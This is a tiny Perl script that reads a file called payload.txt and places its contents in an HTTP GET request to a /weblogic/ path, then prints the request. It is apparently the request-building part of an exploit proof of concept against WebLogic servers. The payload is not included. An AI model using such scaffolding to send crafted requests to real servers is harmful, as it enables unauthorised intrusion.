#!/usr/bin/perl
$| = 1;
open my $fh, '<', 'payload.txt' or die "Could not open payload.txt: $!";
my $buf = do { local $/; <$fh> };  # Read entire file into $buf
close $fh;
$request = "GET /weblogic/ $buf\r\n\r\n";
print $request;
